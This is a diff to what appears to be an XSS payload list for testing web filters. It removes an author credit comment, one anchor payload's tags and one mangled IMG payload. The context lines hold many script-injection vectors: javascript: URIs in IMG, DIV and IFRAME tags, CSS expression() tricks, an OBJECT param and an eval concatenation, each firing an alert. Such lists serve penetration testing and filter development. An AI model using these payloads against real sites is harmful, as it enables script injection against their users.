@@ -2,7 +2,7 @@
 
 ```
 
-<!--        GitHub : https://github.com/ismailtasdelen/ -->
+
 
 
 
@@ -18,7 +18,7 @@ exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("
 <IMG SRC=" &#14;  javascript:alert('XSS');">
 <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
 <IMG SRC=" &#14;  javascript:alert('XSS');">
-<A HREF="http://66.102.7.147/">XSS</A>
+http://66.102.7.147/">XSS
 "><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
 "><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1
 <IMG SRC=" &#14;  javascript:alert('XSS');">
@@ -39,6 +39,6 @@ a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:
 <;DIV STYLE=";background-image: url(&;#1;javascript:alert(';XSS';))";>;
 <;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;
 a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";)";;&#10;eval(a+b+c+d);
-<;IMG SRC="; &;#14;  javascript:alert(';XSS';);";>;
+
 
 
